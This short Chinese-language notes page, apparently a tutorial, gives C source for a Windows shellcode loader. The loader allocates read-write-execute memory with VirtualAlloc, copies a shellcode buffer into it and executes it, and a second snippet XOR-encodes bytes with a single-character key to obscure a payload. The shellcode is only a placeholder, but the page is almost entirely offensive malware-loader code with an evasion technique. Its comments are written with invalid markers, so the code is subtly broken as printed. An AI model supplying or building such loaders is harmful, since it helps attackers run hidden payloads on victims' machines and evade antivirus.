# C语言的shellcodeloader



```
#include <stdio.h>
#include <windows.h>
unsigned char buf[] = "\\shellcode\\";

int main()
{ 
\\\通过定义一个指针，我们后面就可以知道分配是在哪个内存地址进行的。第一个是lpAddress，设置为0，OS会自动找到函数执行的起始地址。第二个是shellcode的大小。第三个参数是分配类型标志，第四个是内存标志。
void *exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
\\\将 shellcode 复制到分配的内存中
memcpy(exec, buf, sizeof buf);
\\\实际执行 shellcode
((void(*)())exec)(); 
return 0;
}
```

XOR 异或加密

C语言实现

```
#include <stdio.h>
unsigned char code[] = "Test";
int main()
{ 
char key = 'K'; int i = 0; for (i; i<sizeof(code); i++) 
  { 
    printf("\\x%02x",code[i]^key);
    }
}
```

